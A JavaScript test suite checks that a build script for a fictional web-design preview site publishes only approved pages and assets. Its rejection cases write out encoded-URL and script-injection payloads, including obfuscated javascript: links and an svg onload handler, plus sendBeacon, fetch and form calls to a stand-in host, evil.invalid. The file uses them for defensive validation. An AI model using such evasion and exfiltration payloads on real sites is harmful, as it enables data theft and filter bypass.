import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { buildPagesArtifact } from "../scripts/build_pages_artifact.mjs";

const disclosure = "Fictional ARC design concept — not a real business. Checkout and lead collection are disabled.";
const customerFolder = "northstar-roofing-acde1234";
const sha256 = value => createHash("sha256").update(value, "utf8").digest("hex");
const projectRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const template=await readFile(path.join(projectRoot,"ARC_MASTER_TEMPLATE.html"),"utf8");
const trustedScripts=(template.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi)||[]).join("\n");

async function put(root, relative, content) {
  const absolute = path.join(root, ...relative.split("/"));
  await mkdir(path.dirname(absolute), { recursive: true });
  await writeFile(absolute, content, "utf8");
}

function customerPreview(folder, { proofFolder = folder, injectedCheckout = "", assetUrl = "" } = {}) {
  const unsigned = `<!doctype html><html><head>
<meta name="robots" content="noindex,nofollow,noarchive">
<meta name="arc-template-version" content="10.0">
</head><body data-arc-site-mode="preview">${trustedScripts}${assetUrl ? `<img src="${assetUrl}" alt="Customer asset">` : ""}${injectedCheckout}
<aside class="arc-preview-toolbar" aria-label="ARC preview purchase"><span><strong>ARC preview</strong>Built for this business. Purchase only if approved.</span><span data-arc-checkout-private>Checkout is available only through the private approval email.</span></aside>
</body></html>`;
  const proof = `<!-- ARC_PREVIEW_PROOF_START -->\n<meta name="arc-preview-folder" content="${proofFolder}">\n<meta name="arc-preview-source-sha256" content="${sha256(unsigned)}">\n<!-- ARC_PREVIEW_PROOF_END -->\n`;
  return unsigned.replace("</head>", `${proof}</head>`);
}

async function listFiles(root, current = root) {
  const result = [];
  for (const entry of await readdir(current, { withFileTypes: true })) {
    const absolute = path.join(current, entry.name);
    if (entry.isDirectory()) result.push(...await listFiles(root, absolute));
    if (entry.isFile()) result.push(path.relative(root, absolute).split(path.sep).join("/"));
  }
  return result.sort();
}

const root = await mkdtemp(path.join(os.tmpdir(), "arc-pages-contract-"));
try {
  const manifest = JSON.parse(await readFile(path.join(projectRoot, "showcases/manifest.json"), "utf8"));
  await put(root, "showcases/manifest.json", `${JSON.stringify(manifest)}\n`);
  await put(root, "showcases/assets/provenance.json", await readFile(path.join(projectRoot, "showcases/assets/provenance.json"), "utf8"));
  for (const item of manifest) {
    await put(root,item.file,await readFile(path.join(projectRoot,item.file),"utf8"));
    const heroBytes = await readFile(path.join(projectRoot,item.heroAsset.file));
    const heroDestination = path.join(root, ...item.heroAsset.file.split("/"));
    await mkdir(path.dirname(heroDestination), { recursive: true });
    await writeFile(heroDestination, heroBytes);
  }
  const png = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=", "base64");
  const assetSha = createHash("sha256").update(png).digest("hex");
  const assetRelative = `${customerFolder}/assets/${assetSha}.png`;
  const assetUrl = `https://arcwebhq-cpu.github.io/arc-previews/${assetRelative}`;
  await put(root, `${customerFolder}/index.html`, customerPreview(customerFolder, { assetUrl }));
  await mkdir(path.dirname(path.join(root, assetRelative)), { recursive: true });
  await writeFile(path.join(root, assetRelative), png);

  // These deliberately contain publishable-looking or sensitive content, but
  // none belongs to one of the two allowed public classes.
  await put(root, "qa-v10/fixture/index.html", customerPreview("fixture-deadbeef"));
  await put(root, "legacy-client-deadbeef/index.html", "<html><meta name=\"robots\" content=\"noindex,nofollow\"><body>v9 history</body></html>");
  await put(root, "deliveries/northstar-roofing-acde1234/index.html", "PRIVATE DELIVERY");
  await put(root, "previews/private/index.html", "PRIVATE PREVIEW");
  await put(root, "zapier/private-token.txt", "PRIVATE SOURCE");
  await put(root, "ARC_MASTER_TEMPLATE.html", "PRIVATE TEMPLATE");
  await put(root, "package.json", "{\"private\":true}\n");

  const output = path.join(root, ".pages-dist");
  const result = await buildPagesArtifact({ root, output });
  const expectedArtifactFiles = [
    ".nojekyll",
    "index.html",
    assetRelative,
    `${customerFolder}/index.html`,
    "showcases/assets/1db7b49151bb0a391d616b8658ab15cdd1d6949426d4e8c96eb12787fb553ce7.webp",
    "showcases/assets/3f8f6dcbc44f0bb37c1dccfad999f20a8a80213486c3c31dc438e89d1be887cb.webp",
    "showcases/assets/c99014acba5ec713042002cda67c4efbbf7c0ecffcb4f6044b3a76134496aa5c.webp",
    "showcases/dental/index.html",
    "showcases/finance/index.html",
    "showcases/roofing/index.html"
  ];
  assert.deepEqual(result.customerPreviews, [customerFolder]);
  assert.deepEqual(result.showcases, ["dental", "finance", "roofing"]);
  assert.deepEqual(await listFiles(output), expectedArtifactFiles);
  const pagesIndex = await readFile(path.join(output, "index.html"), "utf8");
  assert.match(pagesIndex, /noindex,nofollow,noarchive,nosnippet/);
  assert.match(pagesIndex, /fictional quality-assurance concepts, not real businesses/i);
  assert.doesNotMatch(pagesIndex, /<form\b|data-netlify|data-arc-checkout|buy\.stripe\.com/i);
  assert.deepEqual([...pagesIndex.matchAll(/href="([^"]+)"/g)].map(match => match[1]).sort(), [
    "./showcases/dental/",
    "./showcases/finance/",
    "./showcases/roofing/"
  ]);
  assert.equal((await readFile(path.join(output, customerFolder, "index.html"), "utf8")).includes("PRIVATE"), false);
  assert.deepEqual(await readFile(path.join(output, assetRelative)), png);
  const assertRejectedImageAsset = async ({ bytes, extension, label, expected }) => {
    const folder = `invalid-${label}-${createHash("sha256").update(label).digest("hex").slice(0, 8)}`;
    const digest = createHash("sha256").update(bytes).digest("hex");
    const relative = `${folder}/assets/${digest}.${extension}`;
    const url = `https://arcwebhq-cpu.github.io/arc-previews/${relative}`;
    await put(root, `${folder}/index.html`, customerPreview(folder, { assetUrl: url }));
    await mkdir(path.dirname(path.join(root, relative)), { recursive: true });
    await writeFile(path.join(root, relative), bytes);
    try {
      await assert.rejects(
        buildPagesArtifact({ root, output }),
        expected,
        `${label} must fail after valid preview proof and content addressing`
      );
      assert.deepEqual(
        await listFiles(output),
        expectedArtifactFiles,
        `${label} rejection must preserve the last complete artifact`
      );
      assert.deepEqual(
        await readFile(path.join(output, assetRelative)),
        png,
        `${label} rejection must preserve the prior artifact bytes`
      );
    } finally {
      await rm(path.join(root, folder), { recursive: true, force: true });
    }
  };

  const crcTable = Array.from({ length: 256 }, (_, value) => {
    let current = value;
    for (let bit = 0; bit < 8; bit += 1) current = current & 1 ? 0xedb88320 ^ (current >>> 1) : current >>> 1;
    return current >>> 0;
  });
  const crc32 = bytes => {
    let value = 0xffffffff;
    for (const byte of bytes) value = crcTable[(value ^ byte) & 255] ^ (value >>> 8);
    return (value ^ 0xffffffff) >>> 0;
  };
  const pngChunk = (type, content) => {
    const typeBytes = Buffer.from(type, "ascii");
    const data = Buffer.from(content);
    const chunk = Buffer.alloc(12 + data.length);
    chunk.writeUInt32BE(data.length, 0);
    typeBytes.copy(chunk, 4);
    data.copy(chunk, 8);
    chunk.writeUInt32BE(crc32(Buffer.concat([typeBytes, data])), 8 + data.length);
    return chunk;
  };
  const withPngChunk = (type, content) => Buffer.concat([
    png.subarray(0, -12),
    pngChunk(type, content),
    png.subarray(-12)
  ]);
  const webp = Buffer.from("UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEAAUAmJaQAA3AA/v89", "base64");
  const withWebpChunk = (type, content) => {
    const data = Buffer.from(content);
    const chunk = Buffer.alloc(8 + data.length + (data.length & 1));
    chunk.write(type, 0, 4, "ascii");
    chunk.writeUInt32LE(data.length, 4);
    data.copy(chunk, 8);
    const result = Buffer.concat([webp, chunk]);
    result.writeUInt32LE(result.length - 8, 4);
    return result;
  };

  const jpegShell = Buffer.from([255, 216, 255, 217]);
  const pngShell = Buffer.concat([png.subarray(0, 8), png.subarray(-12)]);
  const webpShell = Buffer.alloc(20);
  webpShell.write("RIFF", 0, 4, "ascii");
  webpShell.writeUInt32LE(12, 4);
  webpShell.write("WEBP", 8, 4, "ascii");
  webpShell.write("VP8 ", 12, 4, "ascii");
  const corruptPngCrc = Buffer.from(png);
  corruptPngCrc[29] ^= 1;
  const dimensionBombPng = Buffer.from(png);
  dimensionBombPng.writeUInt32BE(12_001, 16);
  dimensionBombPng.writeUInt32BE(crc32(dimensionBombPng.subarray(12, 29)), 29);

  for (const attack of [
    { bytes: jpegShell, extension: "jpg", label: "jpeg-shell", expected: /malformed JPEG/ },
    { bytes: pngShell, extension: "png", label: "png-shell", expected: /malformed PNG/ },
    { bytes: corruptPngCrc, extension: "png", label: "png-crc", expected: /PNG CRC mismatch/ },
    { bytes: withPngChunk("tEXt", Buffer.from("Author\0private")), extension: "png", label: "png-text", expected: /embedded PNG metadata/ },
    { bytes: dimensionBombPng, extension: "png", label: "png-dimensions", expected: /invalid image dimensions/ },
    { bytes: webpShell, extension: "webp", label: "webp-shell", expected: /malformed WebP/ },
    { bytes: withWebpChunk("EXIF", Buffer.from("Exif\0\0private")), extension: "webp", label: "webp-exif", expected: /embedded WebP metadata/ }
  ]) await assertRejectedImageAsset(attack);

  await assert.rejects(
    buildPagesArtifact({ root, output: path.join(root, "unsafe-output") }),
    /unsafe source or output directory/
  );

  for (const [suffix, encodedEmail] of [
    ["entity", "private&#64;example&#46;test"],
    ["named", "private&commat;example&period;test"],
    ["percent", "private%2540example%252etest"]
  ]) {
    const folder = `encoded-email-${suffix}-abcde${String(200 + suffix.length).slice(-3)}`;
    await put(root, `${folder}/index.html`, customerPreview(folder, { injectedCheckout: `<p>${encodedEmail}</p>` }));
    await assert.rejects(buildPagesArtifact({ root, output }), /contains an email address/, `must reject ${suffix}-encoded email leakage`);
    await rm(path.join(root, folder), { recursive: true });
  }

  const invalidFolder = "tampered-preview-acde9999";
  const tampered = customerPreview(invalidFolder).replace(/arc-preview-source-sha256" content="[a-f0-9]{64}/, `arc-preview-source-sha256" content="${"0".repeat(64)}`);
  await put(root, `${invalidFolder}/index.html`, tampered);
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /source proof hash mismatch/
  );
  assert.deepEqual(await listFiles(output), expectedArtifactFiles, "failed validation replaced the last complete artifact");
  await rm(path.join(root, invalidFolder), { recursive: true });

  const liveFolder = "live-checkout-acde9998";
  await put(root, `${liveFolder}/index.html`, customerPreview(liveFolder, { injectedCheckout:'<a href="https://buy。stripe。com/live_unsafe">Buy</a>' }));
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /private checkout capability/
  );
  await rm(path.join(root, liveFolder), { recursive: true });

  for (const [suffix, injectedCheckout] of [
    ["tab", '<a href="https://buy&Tab;.stripe.com/test_x">Buy</a>'],
    ["newline", '<a href="https://buy&NewLine;.stripe.com/test_x">Buy</a>'],
    ["mixed-percent", '<a href="https://buy%2estripe.com/test%ZZ">Buy</a>'],
    ["formaction", '<button formaction="https://buy%2estripe.com/test_x">Buy</button>'],
    ["soft-hyphen", '<a href="https://bu\u00ady.stripe.com/test_x">Buy</a>'],
    ["soft-hyphen-entity", '<a href="https://bu&shy;y.stripe.com/test_x">Buy</a>'],
    ["named-id", '<span data-note="client&lowbar;reference&lowbar;id">private</span>'],
    ["javascript-tab", '<a href="java\tscript:location=\'https://buy.stripe.com/test_x\'">Buy</a>'],
    ["solidus-handler", '<svg/onload="location=\'https://bu\'+\'y.stripe.com/test_x\'"></svg>'],
    ["style-escape", '<div style="background:u&#92;rl(\'https://buy&#92;.stripe&#92;.com/test_x\')"></div>'],
    ["extra-script", '<script>location=\'https://bu\'+\'y.stripe.com/test_x\'</script >']
  ]) {
    const folder = `encoded-${suffix}-abcde${String(100 + suffix.length).slice(-3)}`;
    await put(root, `${folder}/index.html`, customerPreview(folder, { injectedCheckout }));
    await assert.rejects(buildPagesArtifact({ root, output }), /private checkout capability|unreviewed executable|reviewed script manifest/, `must reject ${suffix}`);
    await rm(path.join(root, folder), { recursive: true });
  }

  for (const [suffix, injectedSurface] of [
    ["tracker", '<img src="https://evil.invalid/tracker.png" alt="">'],
    ["stylesheet", '<link rel="stylesheet" href="https://evil.invalid/styles.css">'],
    ["iframe", '<iframe src="https://evil.invalid/embed"></iframe>'],
    ["object", '<object data="https://evil.invalid/payload"></object>'],
    ["form", '<form action="https://evil.invalid/collect"></form>'],
    ["refresh", '<meta http-equiv="refresh" content="0;url=https://evil.invalid/next">'],
    ["css-import", '<style>@import "https://evil.invalid/styles.css";</style>'],
    ["beacon", '<script>navigator.sendBeacon("https://evil.invalid/collect","x")</script>'],
    ["fetch", '<script>fetch("https://evil.invalid/data")</script>']
  ]) {
    const folder = `remote-${suffix}-abcde${String(300 + suffix.length).slice(-3)}`;
    await put(root, `${folder}/index.html`, customerPreview(folder, { injectedCheckout: injectedSurface }));
    await assert.rejects(
      buildPagesArtifact({ root, output }),
      /ARC_REMOTE_DEPENDENCY_INVALID|reviewed script manifest changed/,
      `must reject ${suffix} egress from a proof-valid customer preview`
    );
    assert.deepEqual(
      await listFiles(output),
      expectedArtifactFiles,
      `${suffix} rejection must preserve the last complete artifact`
    );
    await rm(path.join(root, folder), { recursive: true });
  }

  const mismatchFolder = "mismatch-preview-acde9997";
  await put(root, `${mismatchFolder}/index.html`, customerPreview(mismatchFolder, { proofFolder: "another-preview-acde9996" }));
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /folder proof mismatch|reviewed script manifest changed/
  );
  await rm(path.join(root, mismatchFolder), { recursive: true });

  const ambiguousFolder = "partial-v10-acde9995";
  await put(root, `${ambiguousFolder}/index.html`, `<!doctype html><html><head>
<meta name="robots" content="noindex,nofollow"><meta name="arc-template-version" content="10.0">
</head><body data-arc-site-mode="preview">Incomplete preview</body></html>`);
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /folder proof mismatch|reviewed script manifest changed/
  );
  await rm(path.join(root, ambiguousFolder), { recursive: true });

  const originalAsset = await readFile(path.join(root, assetRelative));
  const tamperedAsset = Buffer.from(originalAsset); tamperedAsset[20] ^= 1;
  await writeFile(path.join(root, assetRelative), tamperedAsset);
  await assert.rejects(buildPagesArtifact({ root, output }), /asset size or digest mismatch/);
  await writeFile(path.join(root, assetRelative), originalAsset);
  const unused = `${customerFolder}/assets/${"f".repeat(64)}.png`;
  await writeFile(path.join(root, unused), png);
  await assert.rejects(buildPagesArtifact({ root, output }), /extra, missing, or non-regular/);
  await rm(path.join(root, unused));
  await rm(path.join(root, assetRelative));
  await symlink(path.join(root, "showcases/roofing/index.html"), path.join(root, assetRelative));
  await assert.rejects(buildPagesArtifact({ root, output }), /extra, missing, or non-regular|may not use symlinks/);
  await rm(path.join(root, assetRelative));
  await writeFile(path.join(root, assetRelative), originalAsset);

  const unsafeShowcase = manifest[0].file;
  const safeShowcase = await readFile(path.join(root, ...unsafeShowcase.split("/")), "utf8");
  await put(root, unsafeShowcase, safeShowcase.replace("</body>", '<form data-netlify="true"></form></body>'));
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /active form or checkout/
  );
  await put(root, unsafeShowcase, safeShowcase);

  const showcaseHero = manifest[0].heroAsset.file;
  const safeShowcaseHero = await readFile(path.join(root, ...showcaseHero.split("/")));
  const tamperedShowcaseHero = Buffer.from(safeShowcaseHero);
  tamperedShowcaseHero[20] ^= 1;
  await writeFile(path.join(root, ...showcaseHero.split("/")), tamperedShowcaseHero);
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /asset size or digest mismatch/
  );
  await writeFile(path.join(root, ...showcaseHero.split("/")), safeShowcaseHero);

  const extraShowcaseHero = path.join(root, "showcases/assets", `${"f".repeat(64)}.webp`);
  await writeFile(extraShowcaseHero, safeShowcaseHero);
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /showcases\/assets contains extra, missing, or non-regular files/
  );
  await rm(extraShowcaseHero);

  const provenancePath = path.join(root, "showcases/assets/provenance.json");
  const safeProvenance = await readFile(provenancePath, "utf8");
  await writeFile(provenancePath, safeProvenance.replace("OpenAI built-in image generator", "unreviewed generator"), "utf8");
  await assert.rejects(buildPagesArtifact({ root, output }), /showcase asset provenance is incomplete/);
  await writeFile(provenancePath, safeProvenance, "utf8");

  await put(root, "showcases/manifest.json", `${JSON.stringify([...manifest, { profile: "extra", file: "showcases/extra/index.html" }])}\n`);
  await assert.rejects(
    buildPagesArtifact({ root, output }),
    /exactly three entries/
  );
} finally {
  await rm(root, { recursive: true, force: true });
}

const workflow = await readFile(path.join(projectRoot, ".github/workflows/preview-quality.yml"), "utf8");
const packageJson = JSON.parse(await readFile(path.join(projectRoot, "package.json"), "utf8"));
assert.equal(
  packageJson.scripts["build:pages"],
  "npm run build:showcases && node scripts/build_pages_artifact.mjs",
  "Pages must regenerate v10-derived showcases in its own fresh runner before allowlisting them"
);
assert.match(workflow, /deploy-pages:[\s\S]*if: github\.event_name == 'push' && github\.ref == 'refs\/heads\/main'[\s\S]*needs: preview-quality/);
assert.match(workflow, /run: npm run build:pages/);
assert.match(workflow, /uses: actions\/upload-pages-artifact@[^\s]+[^\n]*\n[\s\S]*path: \.pages-dist/);
assert.match(workflow, /uses: actions\/deploy-pages@[^\s]+/);
assert.doesNotMatch(workflow, /uses: actions\/upload-pages-artifact@[^\s]+[^\n]*\n[\s\S]{0,120}path:\s*["']?\.["']?\s*$/m);

console.log("PASS Pages publish allowlist: only three inert showcases and proof-bound root v10 previews are deployable.");
console.log("PASS Pages workflow contract: deployment waits for quality and uploads only .pages-dist.");
